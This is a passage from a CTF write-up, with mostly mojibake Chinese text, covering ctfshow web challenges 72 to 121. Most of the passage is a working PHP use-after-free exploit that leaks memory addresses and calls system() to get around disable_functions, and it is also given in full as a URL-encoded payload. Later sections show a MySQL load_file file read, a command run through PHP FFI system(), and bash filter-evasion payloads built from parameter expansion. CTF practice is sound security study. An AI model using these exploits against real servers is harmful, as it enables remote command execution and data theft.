class="line"> </span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"> </span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payloadï¼š</span><br><span class="line">c=%0Afunction%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#x27;WIN&#x27;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%0A%20%20%20%20trigger_uaf(&#x27;x&#x27;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E%0A</span><br></pre></td></tr></table></figure>

<p>å®åœ¨æ˜¯å¤ªé«˜ç«¯äº†ã€‚</p>
<h1 id="Web73"><a href="#Web73" class="headerlink" title="Web73"></a>Web73</h1><p>å’Œ71æ˜¯ä¸€æ ·çš„ï¼Œç›´æ¥æŸ¥çœ‹ç›®å½•ç„¶åincludeå°±è¡Œäº†ã€‚</p>
<h1 id="Web74"><a href="#Web74" class="headerlink" title="Web74"></a>Web74</h1><p>é™åˆ¶äº†ä¸èƒ½ä½¿ç”¨scandirï¼Œæ‰€ä»¥å°±åªèƒ½ä½¿ç”¨72é¢˜çš„æ–¹æ³•åŒºè¯»å–ç›®å½•ï¼Œç„¶åå†ä½¿ç”¨includeå»è¯»å–ã€‚</p>
<h1 id="Web75"><a href="#Web75" class="headerlink" title="Web75"></a>Web75</h1><p>é¦–å…ˆå°±æ˜¯æŸ¥æ–‡ä»¶ï¼Œè¿™ä¸ªåŠæ—¶è¿˜å’Œä¸Šè¾¹çš„ä¸€æ ·çš„æ–¹æ³•</p>
<p>æ•°æ®åº“åå­—éœ€è¦åˆ©ç”¨å‰é¢çš„web58å»æ‰¾</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">pocï¼š</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">	<span class="comment"># åœ¨MySQLä¸­,load_file(å®Œæ•´è·¯å¾„)å‡½æ•°è¯»å–ä¸€ä¸ªæ–‡ä»¶å¹¶å°†å…¶å†…å®¹ä½œä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚</span></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p><strong>é€šè¿‡ php PDO è¿æ¥æ•°æ®åº“ï¼Œé€šè¿‡æ•°æ®åº“çš„å‡½æ•°é—´æ¥æŸ¥è¯¢æ–‡ä»¶å†…å®¹</strong>ï¼Œè¿™é¢˜å…¶å®ä¸ç”¨tryä¹Ÿè¡Œ</p>
<h1 id="Web76"><a href="#Web76" class="headerlink" title="Web76"></a>Web76</h1><p>å’Œä¸Šé¢˜ä¸€æ¨¡ä¸€æ ·çš„åšæ³•å³å¯</p>
<h1 id="Web77"><a href="#Web77" class="headerlink" title="Web77"></a>Web77</h1><p>è¿™é¢˜è¦ç”¨åˆ°ä»€ä¹ˆFFIï¼Œæ²¡å­¦è¿‡çš„ä¸œè¥¿ï¼Œåªèƒ½ç°å­¦äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FFIï¼ˆForeign Function Interfaceï¼‰ï¼Œå³å¤–éƒ¨å‡½æ•°æ¥å£ï¼Œæ˜¯æŒ‡åœ¨ä¸€ç§è¯­è¨€é‡Œè°ƒç”¨å¦ä¸€ç§è¯­è¨€ä»£ç çš„æŠ€æœ¯ã€‚PHPçš„FFIæ‰©å±•å°±æ˜¯ä¸€ä¸ªè®©ä½ åœ¨PHPé‡Œè°ƒç”¨Cä»£ç çš„æŠ€æœ¯ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//åˆ›å»ºä¸€ä¸ªsystemå¯¹è±¡</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//æ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥å°†å†…å®¹è¾“å‡ºåˆ°1.txt</span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="comment">//é€šè¿‡$ffiå»è°ƒç”¨systemå‡½æ•°</span></span><br></pre></td></tr></table></figure>

<p>é‡‡ç”¨cè¯­è¨€å»è¯»å–å°±è¡Œï¼Œè€Œä¸”æ³¨æ„ç›´æ¥è¯»å–æ˜¯æ²¡ç”¨çš„ï¼Œæ‰§è¡Œreadflagå³å¯</p>
<h1 id="Web118"><a href="#Web118" class="headerlink" title="Web118"></a>Web118</h1><p>è¿™é¢˜éœ€è¦ä½¿ç”¨ç¯å¢ƒå˜é‡å»å†™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//åˆ©ç”¨ç³»ç»Ÿå˜é‡æ„é€ nlå‘½ä»¤</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???</span><br><span class="line"></span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;æ˜¯nl</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;PATH:~M&#125;$&#123;PWD:~J&#125; ????.???</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å¾—åˆ°äº†flag</p>
<p>è¿˜æœ‰åˆ«çš„åˆ©ç”¨${PATH}æ„é€ çš„payload</p>
<blockquote>
<p>SHLVLæ˜¯è®°å½•å¤šä¸ª Bash è¿›ç¨‹å®ä¾‹åµŒå¥—æ·±åº¦çš„ç´¯åŠ å™¨,è¿›ç¨‹ç¬¬ä¸€æ¬¡æ‰“å¼€shellæ—¶${SHLVL}&#x3D;1ï¼Œç„¶ååœ¨æ­¤shellä¸­å†æ‰“å¼€ä¸€ä¸ªshellæ—¶${SHLVL}&#x3D;2ã€‚<br>${PWD:$æ˜¯0ï¼Œ${SHLVL}ä¸º1<br>$æ¥æ›¿ä»£æ•°å­—ï¼Œæˆªå–æƒ³è¦çš„å­—ç¬¦ä¸²</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#$&#123;RANDOM&#125;æ˜¯éšæœºæ•°ï¼Œ$&#123;#RANDOM&#125;ä¸€èˆ¬æ˜¯5ï¼Œä¹Ÿå¯èƒ½æ˜¯4</span><br><span class="line">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</span><br><span class="line"></span><br><span class="line">#å…¶ä»–å¸ˆå‚…</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PATH:$&#123;#TERM&#125;:$&#123;SHLVL:~A&#125;&#125; ????.???</span><br></pre></td></tr></table></figure>

<h1 id="Web119"><a href="#Web119" class="headerlink" title="Web119"></a>Web119</h1><p>è¿™æ¬¡ç¦ç”¨äº†<code>$&#123;PATH</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span><br><span class="line"># pwd=/var/www/html</span><br><span class="line"># USER=www-data</span><br><span class="line"># payloadå³ä¸º /???/?at ????.???</span><br><span class="line">ä¸ºäº†æ„é€ /bin/cat </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¹Ÿå¯ä»¥åªè¦aè¿›è¡Œæ„é€ </span><br><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br><span class="line">/???/?a? ????.???</span><br></pre></td></tr></table></figure>

<h1 id="Web120"><a href="#Web120" class="headerlink" title="Web120"></a>Web120</h1><p>å’Œä¸Šé¢˜ä¸€æ ·çš„åšæ³•å³å¯</p>
<h1 id="Web121"><a href="#Web121" class="headerlink" title="Web121"></a>Web121</h1><p>æ˜¯åªèƒ½ä½¿ç”¨pwdäº†</p>
